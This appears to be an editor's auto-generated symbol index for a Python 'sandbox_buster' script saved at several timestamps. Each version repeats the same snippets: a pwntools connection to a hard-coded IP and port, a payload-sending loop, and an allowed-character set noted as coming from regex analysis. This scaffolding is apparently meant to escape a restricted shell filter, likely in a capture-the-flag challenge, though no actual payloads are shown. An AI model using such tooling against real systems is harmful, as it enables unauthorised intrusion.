        "importPath": ".history.sandbox_buster_20250515222424",
        "description": ".history.sandbox_buster_20250515222424",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=10).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515222424",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222424",
        "description": ".history.sandbox_buster_20250515222424",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515222424",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222424",
        "description": ".history.sandbox_buster_20250515222424",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515222424",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222424",
        "description": ".history.sandbox_buster_20250515222424",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515222424",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222424",
        "description": ".history.sandbox_buster_20250515222424",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515222424",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222454",
        "description": ".history.sandbox_buster_20250515222454",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515222454",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222454",
        "description": ".history.sandbox_buster_20250515222454",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=10).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515222454",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222454",
        "description": ".history.sandbox_buster_20250515222454",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515222454",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222454",
        "description": ".history.sandbox_buster_20250515222454",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515222454",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222454",
        "description": ".history.sandbox_buster_20250515222454",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515222454",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222454",
        "description": ".history.sandbox_buster_20250515222454",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515222454",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222535",
        "description": ".history.sandbox_buster_20250515222535",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515222535",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222535",
        "description": ".history.sandbox_buster_20250515222535",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=10).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515222535",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222535",
        "description": ".history.sandbox_buster_20250515222535",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515222535",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222535",
        "description": ".history.sandbox_buster_20250515222535",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515222535",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222535",
        "description": ".history.sandbox_buster_20250515222535",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515222535",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222535",
        "description": ".history.sandbox_buster_20250515222535",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515222535",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222701",
        "description": ".history.sandbox_buster_20250515222701",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515222701",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222701",
        "description": ".history.sandbox_buster_20250515222701",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=10).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515222701",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222701",
        "description": ".history.sandbox_buster_20250515222701",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515222701",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222701",
        "description": ".history.sandbox_buster_20250515222701",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515222701",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222701",
        "description": ".history.sandbox_buster_20250515222701",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515222701",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222701",
        "description": ".history.sandbox_buster_20250515222701",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515222701",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222736",
        "description": ".history.sandbox_buster_20250515222736",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515222736",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222736",
        "description": ".history.sandbox_buster_20250515222736",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=10).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515222736",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515222736",
        "description": ".history.sandbox_buster_20250515222736",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515222736",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222736",
        "description": ".history.sandbox_buster_20250515222736",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515222736",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222736",
        "description": ".history.sandbox_buster_20250515222736",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515222736",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515222736",
        "description": ".history.sandbox_buster_20250515222736",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515222736",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515223114",
        "description": ".history.sandbox_buster_20250515223114",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515223114",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515223114",
        "description": ".history.sandbox_buster_20250515223114",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=10).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515223114",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515223114",
        "description": ".history.sandbox_buster_20250515223114",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515223114",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515223114",
        "description": ".history.sandbox_buster_20250515223114",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515223114",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515223114",
        "description": ".history.sandbox_buster_20250515223114",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515223114",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515223114",
        "description": ".history.sandbox_buster_20250515223114",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515223114",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515224219",
        "description": ".history.sandbox_buster_20250515224219",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515224219",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515224219",
        "description": ".history.sandbox_buster_20250515224219",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=10).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515224219",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515224219",
        "description": ".history.sandbox_buster_20250515224219",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515224219",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515224219",
        "description": ".history.sandbox_buster_20250515224219",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515224219",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515224219",
        "description": ".history.sandbox_buster_20250515224219",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515224219",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515224219",
        "description": ".history.sandbox_buster_20250515224219",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515224219",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515225035",
        "description": ".history.sandbox_buster_20250515225035",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515225035",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515225035",
        "description": ".history.sandbox_buster_20250515225035",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=10).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515225035",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515225035",
        "description": ".history.sandbox_buster_20250515225035",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515225035",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515225035",
        "description": ".history.sandbox_buster_20250515225035",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515225035",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515225035",
        "description": ".history.sandbox_buster_20250515225035",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515225035",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515225035",
        "description": ".history.sandbox_buster_20250515225035",
        "peekOfCode": "ALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None",
        "detail": ".history.sandbox_buster_20250515225035",
        "documentation": {}
    },
    {
        "label": "connect_to_service",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515225120",
        "description": ".history.sandbox_buster_20250515225120",
        "peekOfCode": "def connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")\n        return None\ndef send_payload(conn, payload):",
        "detail": ".history.sandbox_buster_20250515225120",
        "documentation": {}
    },
    {
        "label": "send_payload",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515225120",
        "description": ".history.sandbox_buster_20250515225120",
        "peekOfCode": "def send_payload(conn, payload):\n    \"\"\"Sends a single payload and returns the response.\"\"\"\n    try:\n        print(f\"\\n[+] Sending payload: {repr(payload)}\")\n        conn.sendline(payload.encode())\n        # Increased timeout to allow for potentially longer execution times\n        response = conn.recv(timeout=10).decode(errors='ignore')\n        if response:\n            print(\"[*] Response:\")\n            print(response)",
        "detail": ".history.sandbox_buster_20250515225120",
        "documentation": {}
    },
    {
        "label": "main",
        "kind": 2,
        "importPath": ".history.sandbox_buster_20250515225120",
        "description": ".history.sandbox_buster_20250515225120",
        "peekOfCode": "def main():\n    \"\"\"Main function to run the sandbox buster.\"\"\"\n    conn = connect_to_service(HOST, PORT)\n    if not conn:\n        sys.exit(1)\n    try:\n        # Print initial banner\n        print(\"[+] Initial response:\")\n        initial_response = conn.recv().decode(errors='ignore')\n        print(initial_response)",
        "detail": ".history.sandbox_buster_20250515225120",
        "documentation": {}
    },
    {
        "label": "HOST",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515225120",
        "description": ".history.sandbox_buster_20250515225120",
        "peekOfCode": "HOST = \"94.237.123.126\"\nPORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:",
        "detail": ".history.sandbox_buster_20250515225120",
        "documentation": {}
    },
    {
        "label": "PORT",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515225120",
        "description": ".history.sandbox_buster_20250515225120",
        "peekOfCode": "PORT = 34445\nALLOWED_CHARS = \"0123456789${}/?\\\"[:space:]:&>_=()\" # Based on the regex analysis\ndef connect_to_service(host, port):\n    \"\"\"Connects to the remote service.\"\"\"\n    try:\n        conn = remote(host, port)\n        print(f\"[+] Connected to {host}:{port}\")\n        return conn\n    except Exception as e:\n        print(f\"[-] Error connecting to {host}:{port}: {e}\")",
        "detail": ".history.sandbox_buster_20250515225120",
        "documentation": {}
    },
    {
        "label": "ALLOWED_CHARS",
        "kind": 5,
        "importPath": ".history.sandbox_buster_20250515225120",
        "description": ".history.sandbox_buster_20250515225120",
